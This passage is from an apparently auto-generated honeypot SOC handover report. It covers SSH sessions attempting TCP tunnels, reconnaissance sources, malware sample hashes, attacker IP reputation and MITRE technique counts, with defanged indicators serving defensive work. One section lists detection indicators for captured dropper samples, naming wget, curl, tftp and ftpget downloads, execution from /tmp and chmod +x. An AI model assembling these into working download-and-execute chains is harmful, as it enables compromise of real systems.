| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:37:48` | `cowrie.session.connect` |
| `2026-08-23 10:37:49` | `cowrie.client.version` |
| `2026-08-23 10:37:49` | `cowrie.client.kex` |
| `2026-08-23 10:37:52` | `cowrie.login.success` |
| `2026-08-23 10:37:52` | `cowrie.direct-tcpip.request` |
| `2026-08-23 10:37:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.139.124[.]120` to AbuseIPDB if not already reported
- [ ] Block `125.139.124[.]120` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc92986bba69

| Field | Detail |
|---|---|
| **Source IP** | `178.224.53[.]154` |
| **First Seen** | 2026-08-23 10:40 |
| **Last Seen** | 2026-08-23 10:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:40:42` | `cowrie.session.connect` |
| `2026-08-23 10:40:43` | `cowrie.client.version` |
| `2026-08-23 10:40:43` | `cowrie.client.kex` |
| `2026-08-23 10:40:43` | `cowrie.login.success` |
| `2026-08-23 10:40:43` | `cowrie.direct-tcpip.request` |
| `2026-08-23 10:40:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.224.53[.]154` to AbuseIPDB if not already reported
- [ ] Block `178.224.53[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cfffa5643e1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 10:44 |
| **Last Seen** | 2026-08-23 10:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:44:09` | `cowrie.session.connect` |
| `2026-08-23 10:44:09` | `cowrie.client.version` |
| `2026-08-23 10:44:10` | `cowrie.client.kex` |
| `2026-08-23 10:44:10` | `cowrie.login.success` |
| `2026-08-23 10:44:11` | `cowrie.direct-tcpip.request` |
| `2026-08-23 10:44:11` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 10:44:11` | `cowrie.direct-tcpip.data` |
| `2026-08-23 10:44:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc28d3afe174

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 10:44 |
| **Last Seen** | 2026-08-23 10:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:44:14` | `cowrie.session.connect` |
| `2026-08-23 10:44:14` | `cowrie.client.version` |
| `2026-08-23 10:44:14` | `cowrie.client.kex` |
| `2026-08-23 10:44:15` | `cowrie.login.success` |
| `2026-08-23 10:44:15` | `cowrie.direct-tcpip.request` |
| `2026-08-23 10:44:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 10:44:15` | `cowrie.direct-tcpip.data` |
| `2026-08-23 10:44:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d6d27cbde23

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-23 10:49 |
| **Last Seen** | 2026-08-23 10:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:49:11` | `cowrie.session.connect` |
| `2026-08-23 10:49:11` | `cowrie.client.version` |
| `2026-08-23 10:49:11` | `cowrie.client.kex` |
| `2026-08-23 10:49:11` | `cowrie.login.success` |
| `2026-08-23 10:49:11` | `cowrie.direct-tcpip.request` |
| `2026-08-23 10:49:11` | `cowrie.direct-tcpip.data` |
| `2026-08-23 10:49:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c9e8b9d2637

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 10:53 |
| **Last Seen** | 2026-08-23 10:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:53:41` | `cowrie.session.connect` |
| `2026-08-23 10:53:41` | `cowrie.client.version` |
| `2026-08-23 10:53:41` | `cowrie.client.kex` |
| `2026-08-23 10:53:42` | `cowrie.login.success` |
| `2026-08-23 10:53:42` | `cowrie.direct-tcpip.request` |
| `2026-08-23 10:53:43` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 10:53:43` | `cowrie.direct-tcpip.data` |
| `2026-08-23 10:53:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71f8b303f155

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 10:53 |
| **Last Seen** | 2026-08-23 10:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:53:44` | `cowrie.session.connect` |
| `2026-08-23 10:53:44` | `cowrie.client.version` |
| `2026-08-23 10:53:45` | `cowrie.client.kex` |
| `2026-08-23 10:53:45` | `cowrie.login.success` |
| `2026-08-23 10:53:46` | `cowrie.direct-tcpip.request` |
| `2026-08-23 10:53:46` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 10:53:46` | `cowrie.direct-tcpip.data` |
| `2026-08-23 10:53:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `115.190.119[.]177` | **6** | 2026-08-23 09:36 | 2026-08-23 09:49 | 3m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **5** | 2026-08-23 09:07 | 2026-08-23 10:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.204.128[.]149` | **5** | 2026-08-23 10:28 | 2026-08-23 10:52 | 2m | 0 | `T1592` | 🟢 LOW |
| `195.88.120[.]62` | **3** | 2026-08-23 09:39 | 2026-08-23 09:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `183.57.179[.]136` | **2** | 2026-08-23 09:13 | 2026-08-23 09:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `37.54.201[.]77` | **2** | 2026-08-23 10:19 | 2026-08-23 10:24 | 0m | 0 | `T1592` | 🟢 LOW |
| `125.59.204[.]176` | 1 | 2026-08-23 09:32 | 2026-08-23 09:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `156.238.86[.]2` | 1 | 2026-08-23 09:32 | 2026-08-23 09:33 | 3s | 0 | `T1592` | 🟢 LOW |
| `176.170.1[.]244` | 1 | 2026-08-23 09:51 | 2026-08-23 09:51 | 7s | 0 | `T1592` | 🟢 LOW |
| `189.56.0[.]19` | 1 | 2026-08-23 09:51 | 2026-08-23 09:51 | 1s | 0 | `T1592` | 🟢 LOW |
| `198.163.193[.]129` | 1 | 2026-08-23 10:47 | 2026-08-23 10:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]197` | 1 | 2026-08-23 09:36 | 2026-08-23 09:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.59.88[.]179` | 1 | 2026-08-23 09:00 | 2026-08-23 09:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `80.216.156[.]131` | 1 | 2026-08-23 10:40 | 2026-08-23 10:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `83.226.56[.]106` | 1 | 2026-08-23 09:35 | 2026-08-23 09:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `83.255.208[.]30` | 1 | 2026-08-23 10:27 | 2026-08-23 10:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.165.104[.]58` | 1 | 2026-08-23 10:35 | 2026-08-23 10:35 | 31s | 0 | `T1592` | 🟢 LOW |
| `90.230.226[.]175` | 1 | 2026-08-23 10:00 | 2026-08-23 10:02 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `85.165.104[.]58` | NO | Telenor Norge AS | **100** ⚠️ | 11 |
| `62.148.236[.]52` | RU | Nokia DSL Network | **100** ⚠️ | 1 |
| `2.184.236[.]166` | IR | Iran Information Technology Company PJSC | **100** ⚠️ | 1 |
| `65.20.196[.]154` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 1 |
| `83.255.208[.]30` | SE | Tele2 Sverige AB | **100** ⚠️ | 2 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `108.213.119[.]22` | US | AT&T Enterprises, LLC | **100** ⚠️ | 1 |
| `124.160.255[.]180` | CN | China Unicom Zhejiang province network | **100** ⚠️ | 1 |
| `46.59.88[.]179` | SE | Bahnhof AB | **100** ⚠️ | 2 |
| `176.170.1[.]244` | FR | Bouygues Telecom Division Mobile | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 86 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 72 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 1 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |

---

## 🔕 False Positive Summary (15 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 17 below threshold 25 | 2 |
| AbuseIPDB score 20 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 7 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 122 cases |
| Tool 34  | Credential Extractor        | ✅ 91 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 65 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 15 filtered (12.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 54 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 17 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 72 priority case(s) shown individually · 18 recon entry/entries in table (6 group(s) consolidating 23 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-23T12:48:13Z_
